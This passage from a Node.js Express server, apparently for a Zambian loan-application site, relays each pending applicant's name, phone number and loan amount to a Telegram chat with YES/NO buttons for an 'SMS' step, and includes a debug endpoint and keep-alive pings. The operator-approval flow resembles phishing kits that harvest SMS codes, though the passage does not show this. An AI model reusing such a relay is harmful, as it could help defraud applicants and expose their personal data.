            message: 'Backup created',
            file: backupFile
        });
    } catch (error) {
        res.status(500).json({ ok: false, error: error.message });
    }
});

// ─── TEMP DIAGNOSTIC — hit once, then remove ───
app.get('/api/debug/telegram-test', async (req, res) => {
    const results = {};

    try {
        const r = await fetch(`${TELEGRAM_API_URL}/getMe`);
        results.getMe = await r.json();
    } catch (e) { results.getMe = { error: e.message, code: e.code }; }

    try {
        const r = await fetch(`${TELEGRAM_API_URL}/getChat?chat_id=${TELEGRAM_CHAT_ID}`);
        results.getChat = await r.json();
    } catch (e) { results.getChat = { error: e.message, code: e.code }; }

    try {
        const r = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: '🧪 Diagnostic ping (Zambia) — sending works.'
            })
        });
        results.sendMessage = await r.json();
    } catch (e) { results.sendMessage = { error: e.message, code: e.code }; }

    res.json(results);
});

// ─── Serve Frontend (catch-all AFTER API routes) ───
app.get('*', (req, res) => {
    if (req.path.startsWith('/api/')) {
        return res.status(404).json({ ok: false, error: 'Endpoint not found' });
    }
    res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
});

// ─── Listen ───
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📁 Serving frontend from: ${path.join(__dirname, '../frontend')}`);
    console.log(`💾 Data directory: ${DATA_DIR}`);
    console.log(`🔗 Visit: http://localhost:${PORT}`);

    // Register webhook if PUBLIC_URL + secret are configured
    if (PUBLIC_URL && TELEGRAM_WEBHOOK_SECRET) {
        const webhookUrl = `${PUBLIC_URL.replace(/\/$/, '')}/api/telegram-webhook`;
        tgFetch('setWebhook', {
            url: webhookUrl,
            secret_token: TELEGRAM_WEBHOOK_SECRET,
            drop_pending_updates: false
        }, { retries: 2 }).then(r => {
            console.log('🔗 setWebhook:', r.ok ? '✅ registered' : `❌ ${r.description || r.error}`);
        }).catch(e => console.error('setWebhook error:', e.message));
    } else if (PUBLIC_URL) {
        console.warn('⚠️ PUBLIC_URL set but TELEGRAM_WEBHOOK_SECRET missing — skipping auto-register');
    }

    // Warm-up ping so cold-start TCP is ready before the first user
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        setTimeout(async () => {
            const r = await tgFetch('getMe', {}, { retries: 2 });
            console.log('🔥 Warm-up getMe:', r.ok ? '✅' : `❌ ${r.description || r.error}`);
        }, 2000);
    }
});

// ─── Background sweeper — retries notifications that failed to send ───
setInterval(async () => {
    for (const [id, app] of Object.entries(applications)) {
        if (app.smsStatus === 'pending' && !app.notifiedAt) {
            const age = Date.now() - new Date(app.updatedAt).getTime();
            if (age > 60000) {
                console.log(`🔁 Re-notifying admin about ${id}`);
                const tg = await sendTelegramMessage(
                    `⏰ *REMINDER — PENDING APPLICATION (ZAMBIA)*\n🆔 ${escapeMd(id)}\n👤 ${escapeMd(app.firstName)} ${escapeMd(app.lastName)}\n📱 +260${escapeMd(app.phone)}\n💰 ZMW ${Number(app.loanAmount || 0).toLocaleString()}`,
                    [[
                        { text: '✅ YES', callback_data: JSON.stringify({ action: 'YES', step: 'SMS', applicationId: id }) },
                        { text: '❌ NO', callback_data: JSON.stringify({ action: 'NO', step: 'SMS', applicationId: id }) }
                    ]]
                );
                if (tg.ok) {
                    app.notifiedAt = new Date().toISOString();
                    saveApplications();
                }
            }
        }
    }
}, 30000);

// ─── Keep-alive self-ping (helps fight Render free-tier spin-down) ───
if (PUBLIC_URL) {
    const pingUrl = `${PUBLIC_URL.replace(/\/$/, '')}/health`;
    setInterval(() => {
        fetch(pingUrl, { method: 'GET' })
            .then(r => console.log(`🫀 self-ping ${r.status}`))
            .catch(e => console.warn(`🫀 self-ping failed: ${e.message}`));
    }, 10 * 60 * 1000);
}
